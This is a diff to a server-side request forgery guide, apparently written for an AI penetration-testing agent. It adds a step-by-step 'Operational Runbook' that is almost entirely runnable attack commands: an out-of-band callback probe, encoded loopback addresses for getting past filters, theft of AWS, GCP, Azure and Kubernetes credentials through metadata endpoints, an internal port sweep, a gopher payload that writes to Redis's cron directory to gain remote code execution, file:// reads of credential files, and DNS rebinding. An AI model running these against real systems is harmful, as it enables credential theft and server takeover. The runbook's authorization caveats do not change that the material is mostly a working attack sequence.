@@ -133,6 +133,135 @@ Server-Side Request Forgery enables the server to reach networks and services th
 - SSRF → Redis/FCGI/Docker → file write/command execution → shell
 - SSRF → Kubelet/API → pod list/logs → token/secret discovery → lateral movement
 
+## Operational Runbook
+
+Once a candidate user-controlled URL/host param is identified, this is the canonical confirmation + exploitation sequence.
+
+### Step 1 — OAST oracle (fastest confirmation)
+
+```bash
+# Spin up a Burp Collaborator client OR use interactsh
+interactsh-client -v >/tmp/oast.log &
+OAST_HOST=$(grep -oE '[a-z0-9]+\.oast\.fun' /tmp/oast.log | head -1)
+
+# Spray the candidate param against the OAST host
+curl -s "<TARGET>?<PARAM>=http://${OAST_HOST}/strix-probe"
+sleep 5
+
+# Check log for DNS+HTTP hit
+grep "strix-probe" /tmp/oast.log
+```
+
+A hit confirms the server made an outbound request to your hostname. This is **evidence #1**.
+
+### Step 2 — internal address probing (loopback first)
+
+Once OAST confirms server-side fetch, escalate to internal:
+
+```bash
+# Loopback variants — each form bypasses different filters
+for url in \
+    "http://127.0.0.1/" \
+    "http://localhost/" \
+    "http://[::1]/" \
+    "http://0.0.0.0/" \
+    "http://2130706433/" \
+    "http://0x7f.0x0.0x0.0x1/" \
+    "http://0177.0.0.01/" \
+    "http://[0:0:0:0:0:ffff:127.0.0.1]/"; do
+  printf "%-50s → " "$url"
+  curl -s -o /tmp/probe.html -w '%{http_code} %{size_download}\n' \
+    "<TARGET>?<PARAM>=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$url'))")"
+done
+```
+
+Different status codes / sizes per probe → the server reached *some* of these endpoints (filter exists but is bypassable). Identical responses across all → strict allowlist (only OAST host accepted earlier).
+
+### Step 3 — cloud metadata sweep
+
+Highest-impact targets first. Try in order; stop on first hit:
+
+```bash
+# AWS IMDSv1 (no token needed — most common SSRF win)
+curl -s "<TARGET>?<PARAM>=http://169.254.169.254/latest/meta-data/iam/security-credentials/" \
+  -o /tmp/aws_role.txt
+# If the response contains a role name, follow up:
+ROLE=$(cat /tmp/aws_role.txt | tr -d '[:space:]')
+curl -s "<TARGET>?<PARAM>=http://169.254.169.254/latest/meta-data/iam/security-credentials/${ROLE}" \
+  -o /tmp/aws_creds.json
+# Extract AccessKeyId, SecretAccessKey, Token from JSON
+
+# AWS IMDSv2 (token required — try via PUT if HTTP method controllable, else attempt single-shot)
+curl -s "<TARGET>?<PARAM>=http://169.254.169.254/latest/api/token"
+# If you can issue PUT or the endpoint is misconfigured, retry the meta-data path
+
+# GCP metadata (always requires Metadata-Flavor: Google header — SSRF must permit it)
+curl -s "<TARGET>?<PARAM>=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" \
+  -H "Metadata-Flavor: Google"
+
+# Azure IMDS
+curl -s "<TARGET>?<PARAM>=http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" \
+  -H "Metadata: true"
+
+# Kubernetes service account token (when inside a pod)
+curl -s "<TARGET>?<PARAM>=file:///var/run/secrets/kubernetes.io/serviceaccount/token"
+```
+
+**Document captured tokens by source + scope, NOT by raw value** — `aws_iam_token captured for role <ROLE>; scope: <permissions>` not the actual token string. Live tokens echoed to the report risk secret-scanner revocation.
+
+### Step 4 — internal service enumeration
+
+```bash
+# Quick port-status sweep via SSRF (response-size differential reveals open ports)
+for port in 22 80 443 3306 5432 6379 8080 8443 9200 9300 27017 11211; do
+  result=$(curl -s "<TARGET>?<PARAM>=http://127.0.0.1:${port}/" \
+    -o /dev/null -w '%{http_code} %{size_download} %{time_total}')
+  echo "127.0.0.1:${port} → $result"
+done
+```
+
+Status `200`/`400` (vs `connection refused` → `502`) on a port indicates an open service. High-priority follow-ups: Redis (6379 → can SSRF→gopher RCE), Memcached (11211), Elasticsearch (9200 → full index dump).
+
+### Step 5 — gopher pivot (Redis / MySQL / SMTP RCE)
+
+When SSRF supports `gopher://`, you can craft arbitrary TCP payloads — most useful against Redis for unauth RCE:
+
+```python
+# Build a gopher URL that sends Redis commands
+redis_cmd = "SET 1 'config_set' \\r\\nCONFIG SET dir /var/spool/cron/\\r\\nCONFIG SET dbfilename root\\r\\nSAVE\\r\\n"
+# Each newline → %0D%0A in the gopher URL
+encoded = urllib.parse.quote(redis_cmd)
+ssrf_url = f"gopher://127.0.0.1:6379/_{encoded}"
+```
+
+This is high-risk — only execute when `opsec_level: loud` AND the scope explicitly authorizes RCE pivots. Otherwise document the *capability* and stop.
+
+### Step 6 — file:// scheme (LFI via SSRF)
+
+When `file://` is accepted:
+
+```bash
+# Read sensitive files via SSRF
+curl -s "<TARGET>?<PARAM>=file:///etc/passwd"
+curl -s "<TARGET>?<PARAM>=file:///etc/hosts"
+curl -s "<TARGET>?<PARAM>=file:///var/run/secrets/kubernetes.io/serviceaccount/token"
+curl -s "<TARGET>?<PARAM>=file:///.aws/credentials"
+curl -s "<TARGET>?<PARAM>=file:///proc/self/environ"  # env vars
+```
+
+### Step 7 — DNS rebinding (TOCTOU bypass)
+
+When the target validates the hostname BEFORE the actual fetch and the gap is exploitable, use DNS rebinding:
+
+```bash
+# Set up a domain whose A record alternates between 1.2.3.4 (allowlisted CDN)
+# and 169.254.169.254 (target). Tools: rbndr.us, taviso/rbndr
+# Many targets that "allow whitelisted CDN" lose because validation hits
+# the public IP, then the actual fetch hits the metadata IP.
+
+curl -s "<TARGET>?<PARAM>=http://1.2.3.4.169.254.169.254.rbndr.us/latest/meta-data/iam/"
+```
+
 ## Testing Methodology
 
 1. **Identify surfaces** - Every user-influenced URL/host/path across web/mobile/API and background jobs
